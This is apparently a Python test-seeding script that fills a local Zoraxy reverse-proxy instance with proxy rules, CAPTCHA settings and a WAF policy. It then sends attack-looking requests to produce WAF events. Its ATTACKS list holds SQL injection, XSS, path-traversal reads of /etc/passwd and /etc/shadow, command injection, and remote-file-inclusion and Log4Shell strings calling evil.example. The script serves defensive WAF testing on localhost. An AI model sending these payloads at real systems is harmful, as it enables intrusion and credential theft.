#!/usr/bin/env python3
"""Seed a throw-away Zoraxy instance (started with -noauth -dev -default_inbound_port N) with realistic data:
a dozen proxy rules, CAPTCHA on some of them, a WAF policy, and WAF events produced by attack-looking requests
sent through the proxy to an in-process upstream. Never run it against a real instance.

Usage: seed.py --url http://127.0.0.1:28783 --proxy-port 28443 [--upstream-port 28901] [--keep-upstream]
"""
import argparse
import http.client
import http.cookiejar
import http.server
import json
import re
import ssl
import threading
import time
import urllib.parse
import urllib.request

ap = argparse.ArgumentParser()
ap.add_argument("--url", required=True)
ap.add_argument("--proxy-port", type=int, required=True)
ap.add_argument("--upstream-port", type=int, default=28901)
ap.add_argument("--keep-upstream", action="store_true", help="keep serving after seeding (until Ctrl-C)")
args = ap.parse_args()

jar = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))
html = opener.open(args.url + "/").read().decode()
token = re.search(r'zoraxy.csrf.Token" content="([^"]+)"', html).group(1)


def api(path, data=None, method=None):
    body = urllib.parse.urlencode(data).encode() if data is not None else None
    req = urllib.request.Request(args.url + path, data=body, method=method or ("POST" if data is not None else "GET"))
    req.add_header("X-CSRF-Token", token)
    with opener.open(req) as r:
        txt = r.read().decode()
    try:
        return json.loads(txt)
    except ValueError:
        return txt


class Upstream(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        self.wfile.write(b"upstream ok\n")

    do_POST = do_GET

    def log_message(self, *a):
        pass


srv = http.server.ThreadingHTTPServer(("127.0.0.1", args.upstream_port), Upstream)
threading.Thread(target=srv.serve_forever, daemon=True).start()

HOSTS = ["shop", "blog", "api", "grafana", "git", "wiki", "mail", "cloud", "status", "docs", "media", "admin"]
TAGS = {"shop": "public,prod", "blog": "public", "api": "prod", "grafana": "internal", "git": "internal",
        "wiki": "internal", "admin": "internal"}
DOM = ".example.test"
for h in HOSTS:
    r = api("/api/proxy/add", {"type": "host", "rootname": h + DOM, "ep": "127.0.0.1:%d" % args.upstream_port,
                               "tls": "false", "tlsval": "false", "bypassGlobalTLS": "false", "tags": TAGS.get(h, "")})
    if isinstance(r, dict) and r.get("error"):
        print("add", h, r["error"])

TS = {"captchaProvider": "0", "captchaSiteKey": "1x00000000000000000000AA", "captchaSecretKey": "1x0000000000000000000000000000000AA"}
caps = {
    "shop": dict(TS, captchaTitle="Shop security check", captchaHeading="One quick check", captchaAccent="#d9480f",
                 captchaTheme="light", captchaSessionDuration="7200", turnstileMode="managed"),
    "blog": dict(TS, captchaSessionDuration="86400"),
    "admin": dict(TS, captchaSessionDuration="900", captchaBlockedMessage="Admin area. Your request was blocked."),
    "api": {"captchaProvider": "1", "captchaSiteKey": "6LeIxAcTAAAAAJcZVRqyHh71UMIEGNQ_MXjiZKhI",
            "captchaSecretKey": "6LeIxAcTAAAAAGG-vFI1TnRWxMZNFuojJ4WifJWe", "captchaRecaptchaVersion": "v2"},
    "wiki": {"captchaProvider": "2", "captchaSecretKey": "0123456789abcdef0123456789abcdef", "captchaSessionDuration": "3600"},
}
for h, extra in caps.items():
    d = {"rootname": h + DOM, "captcha": "true"}
    d.update(extra)
    r = api("/api/proxy/edit", d)
    if isinstance(r, dict) and r.get("error"):
        print("captcha", h, r["error"])

# WAF: detection only for everything that inherits, block on two, off on one
pol = {"Enabled": True, "DefaultMode": "detection_only", "ParanoiaLevel": 1, "InboundThreshold": 5,
       "MaxBodyBytes": 131072, "AllowEndpointOverride": False, "ExcludedRuleIDs": ["920350"],
       "PathExclusions": [{"Path": "/api/search", "Exact": False, "RuleIDs": ["942100"]}],
       "TrustedPaths": [], "AllowedIPs": []}
print("waf policy", api("/api/waf/policy", {"policy": json.dumps(pol)}))
print("waf shop", api("/api/waf/endpoint/set", {"rootname": "shop" + DOM, "source": "block"}))
print("waf api", api("/api/waf/endpoint/set", {"rootname": "api" + DOM, "source": "block"}))
print("waf media", api("/api/waf/endpoint/set", {"rootname": "media" + DOM, "source": "off"}))

ATTACKS = [
    "/?id=1%27%20OR%20%271%27=%271", "/search?q=%3Cscript%3Ealert(1)%3C/script%3E", "/../../../../etc/passwd",
    "/?cmd=;cat%20/etc/passwd", "/index.php?page=http://evil.example/shell.txt", "/?x=${jndi:ldap://evil.example/a}",
    "/wp-admin/install.php?id=1%20UNION%20SELECT%201,2,3", "/api/search?q=1%27%20or%20sleep(5)--",
    "/?file=....//....//etc/shadow", "/admin/.env", "/?q=%3Cimg%20src=x%20onerror=alert(1)%3E",
]
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
sent = 0
for i in range(70):
    host = HOSTS[(i * 5) % len(HOSTS)] + DOM
    src = "127.0.0.%d" % (2 + i % 9)
    try:
        c = http.client.HTTPSConnection("127.0.0.1", args.proxy_port, context=ctx, timeout=5, source_address=(src, 0))
        c.request("GET", ATTACKS[i % len(ATTACKS)], headers={"Host": host, "User-Agent": "Mozilla/5.0 (seed)" if i % 4 else "sqlmap/1.7"})
        c.getresponse().read()
        c.close()
        sent += 1
    except Exception as e:
        print("request failed:", e)
        break
print("sent %d attack requests" % sent)
time.sleep(0.5)
ev = api("/api/waf/events?limit=5")
print("events visible:", len(ev) if isinstance(ev, list) else ev)
if args.keep_upstream:
    print("upstream serving on %d, Ctrl-C to stop" % args.upstream_port)
    try:
        while True:
            time.sleep(60)
    except KeyboardInterrupt:
        pass
